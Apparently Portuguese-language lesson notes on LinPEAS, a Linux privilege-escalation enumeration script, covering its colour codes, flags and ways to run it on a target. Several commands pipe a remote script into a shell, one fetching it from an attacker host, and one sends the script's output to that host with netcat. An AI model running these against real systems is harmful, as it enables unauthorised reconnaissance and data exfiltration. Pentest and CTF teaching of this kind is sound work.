
<div align="center">
  <img src="https://tse1.mm.bing.net/th/id/OIP.RCnpa_i2WRAyvdItt3ZA9QHaC4?cb=thfvnextfalcon2&rs=1&pid=ImgDetMain&o=7&rm=3" alt="LinPEAS" width="600"/>
</div>

# LinPEAS

➡️ [PDF da Aula](LinPEAS.pdf) desenvolvido por [@rideckszz](https://github.com/rideckszz)

---
##  Introdução ao LinPEAS

O LinPEAS é um script em bash que automatiza a enumeração para elevação de privilégios em sistemas Linux/Unix/MacOS. O script não realiza a exploração em si, mas gera um relatório apontando falhas de configuração, vulnerabilidades conhecidas, permissões de arquivo inadequadas e senhas armazenadas em texto plano.

➡️ Repositório oficial: [PEASS-ng](https://github.com/peass-ng/PEASS-ng)

## Cores no LinPEAS

Como o output gerado pelo script é extenso, o LinPEAS utiliza um sistema de cores que categoriza a probabilidade de sucesso de cada achado.

- 🟥 **Vermelho com fundo Amarelo:** Indica uma probabilidade extremamente alta de elevação de privilégios.
- 🟥 **Vermelho:** Representa configurações suspeitas ou dados que requerem análise detalhada. Pode indicar serviços rodando com privilégios excessivos ou arquivos críticos com permissões de escrita abertas.
- 🟩 **Verde:** Aponta configurações seguras ou padrão do sistema.
- 🟦 **Azul:** Informa sobre a infraestrutura do sistema, usuários sem shell e dispositivos montados.
- 🟪 **Magenta/Ciano:** Destacam usuário atual e usuários com shell.

## Executando o LinPEAS

A forma de transferir e executar o LinPEAS varia de acordo com o nível de acesso e as restrições de rede da máquina alvo.

#### Via GitHub (Download Direto):

Recomendado para sistemas que possuem acesso de saída para a internet. O comando realiza o download do script e o executa diretamente na memória.

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

#### Via Rede Local:

Utilizado quando a máquina alvo possui restrições de acesso, mas permite comunicação com outra máquina.

*No host atacante:*

Inicie um servidor web no diretório onde o script está armazenado.

```bash
# No host atacante
sudo python3 -m http.server 80
```

*Na máquina alvo*

Faça a requisição HTTP, usando `curl`, para a sua máquina e execute o script.

```bash
# Na máquina alvo
curl http://<IP_ATTACKER>/linpeas.sh | bash
```

#### Enviando saída para o host:

Utilizado para evitar travamentos no terminal da máquina alvo ou para armazenar o log da enumeração localmente para análise posterior.

```bash
# No host atacante
nc -lvnp 9002 | tee linpeas.out

# Na máquina alvo
curl http://<IP_ATTACKER>:8000/linpeas.sh | sh | nc <IP_ATTACKER> 9002
```

###  Principais Parâmetros

A execução padrão atende à maioria dos cenários, mas o uso de flags permite modificar o comportamento do script para situações específicas.

- `-a`: Executa todas as verificações (recomendado para CTFs)
- `-r`: Busca por chaves de API e padrões em arquivos
- `-s`: Modo rápido e discreto (não grava no disco)
- `-e`: Executa verificações extras
- `-P`: Fornece senha para sudo -l e brute force

## Exemplo de Output

Durante a execução, o script separará as informações em blocos categóricos. Abaixo está uma representação de como o script destaca uma vulnerabilidade crítica, como uma permissão Capabilities.

<div align="center">
  <img src="https://nickhoskins.com/images/hack-the-box/cap/linpeas-capabilities.jpg" alt="Exemplo de Output" width="600"/>
</div>
O script destacou o arquivo `/usr/bin/python3.8` com a coloração Vermelho/Amarelo, indicando uma probabilidade quase certa de elevação de privilégios. O vetor principal de ataque neste bloco é a presença da capability `cap_setuid`.

